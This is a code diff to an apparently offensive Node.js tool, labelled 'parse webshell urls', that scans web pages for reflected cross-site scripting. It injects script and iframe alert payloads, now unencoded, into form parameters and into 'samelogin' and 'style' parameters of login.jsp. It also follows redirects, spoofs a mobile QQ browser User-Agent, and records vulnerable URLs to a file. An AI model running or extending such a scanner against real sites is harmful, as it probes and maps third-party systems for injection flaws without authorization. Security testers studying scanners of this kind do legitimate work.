@@ -32,6 +32,7 @@ program.version("parse webshell urls 1.0")
 			
 			.option('-u, --url [value]', 'url')
 			.option('-l, --len [value]', 'default 180')
+			.option('-s, --skip [value]', 'default true,skip data/xssUrls.txt')
 			.option('-v, --verbose', 'show logs')
 			.on('--help',function()
 			{
@@ -40,6 +41,7 @@ program.version("parse webshell urls 1.0")
 			})
             .parse(process.argv);
 mylen = program.len || mylen;
+var g_bSkip = program.skip || true;
 // 获取一个包装后的请求对象，包含设置代理后的
 	// 优先使用系统环境变量中的代理，如果设置了，则覆盖系统代理
 function fnGetRequest(req,opt)
@@ -76,30 +78,35 @@ function fnGetRequest(req,opt)
 "}alert(2);if(1){//
 ");}alert(1);{//
 */
-var xss_wt = fs.readFileSync("tools/xss_whitelist.txt").toString("utf-8");
+var xss_wt = fs.readFileSync("tools/xss_whitelist.txt").toString("utf-8"),
+	xss_Oks = g_bSkip?fs.readFileSync("data/xssUrls.txt").toString("utf-8") :"";
 function fnDoReq(req,opt,fnCbk)
 {
 	var o = {
 		method: opt.body ? 'POST':'GET',
-		"content-type":"application/x-www-form-urlencoded",
 		"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 V1_AND_SQ_7.1.8_718_YYB_D PA QQ/7.1.8.3240 NetType/4G WebP/0.3.0 Pixel/540"
 	};
+	if(opt.body)o["content-type"] = "application/x-www-form-urlencoded";
 	for(var k in opt)
 	{
 		o[k] = opt[k];
 	}
-	req(o,function(e,r,b)
+	
+	var xxUrl = o.uri;delete o.uri;
+	console.log(o);
+	req(xxUrl,o,function(e,r,b)
 	{
-		// console.log(b);
+		//console.log(b);
 		if(!e && b)
 		{
-			fnCbk(String(b));
+			fnCbk(String(b),r.headers);
 		}
 	});
 }
 
 function fnInfo(url,ss,i)
 {
+	fs.appendFileSync("data/xssUrls.txt", url + "\n");
 	console.log("found XSS: " + url);
 	if(program && program.verbose)
 	{
@@ -107,10 +114,15 @@ function fnInfo(url,ss,i)
 	}
 }
 
-function fnDoCheckUrl(szUrl)
+var g_ScrIpt = "iframe";
+function fnDoCheckUrl(szUrl,fnCbk1)
 {
-	szUrl = szUrl.replace(/[\s\r\n]/gmi,'').replace(/[^\/\.]+\?.*?$/gmi,'');
-	var url = szUrl,szOurl = url, req = fnGetRequest(request),  s = "<ScrIpt>alert(" + new Date().getTime() + ")</script>";
+	szUrl = szUrl.trim().replace(/[\s\r\n]*/gmi,'');
+	if(g_bSkip && xss_Oks && -1 < xss_Oks.indexOf(szUrl))return;
+	// http://1.1.1.1
+	szUrl = szUrl.substr(0,14) + szUrl.substr(14).replace(/[^\/\.]+\?.*?$/gmi,'');
+	var url = szUrl,szOurl = url, req = fnGetRequest(request),  s = "<" + g_ScrIpt + ">alert(" + new Date().getTime() + ")</" + g_ScrIpt + ">";
+	// console.log([url, szOurl])
 	// 寻找注入点
 	fnDoReq(req,{uri:szOurl,
 		},function(b3)
@@ -133,7 +145,7 @@ function fnDoCheckUrl(szUrl)
 					if(0 < aP.length)
 					{
 						aP.push("")
-						myXss = aP.join("=" + encodeURIComponent(s) + "&");
+						myXss = aP.join("=" + (s) + "&");
 						// console.log(myXss);
 						fnDoReq(req,{uri:szOurl,body:myXss},function(b1)
 						{
@@ -161,9 +173,11 @@ function fnDoCheckUrl(szUrl)
 	// console.log([aH,url])
 	if(url)
 		url = url.replace(/\/[^\/]*$/gmi, "/");
-	url = aH + url + "/login.jsp?samelogin=" + encodeURIComponent("null\";</script>" + s);
-	// console.log(url)
-	fnDoReq(req,{uri:url},function(b)
+	// encodeURIComponent
+	var sxPay = ("null\";</" + g_ScrIpt + ">" + s);
+	url = aH + url + "/login.jsp?samelogin=" + sxPay + "&style=" + sxPay;
+	console.log(url)
+	fnDoReq(req,{uri:url},function(b,headers)
 	{
 		if(b)
 		{
@@ -172,11 +186,19 @@ function fnDoCheckUrl(szUrl)
 			{
 				fnInfo(szOurl,ss,i);
 			}
+			else if(headers)fnCbk1(headers);
 		}
 	});
 }
 
 if(program.url)
 {
-	fnDoCheckUrl(program.url)	
+	fnDoCheckUrl(program.url,function(h)
+	{
+		if(h['location'])
+		{
+			console.log("location: " + h['location']);
+			fnDoCheckUrl(h['location']);
+		}
+	})	
 }
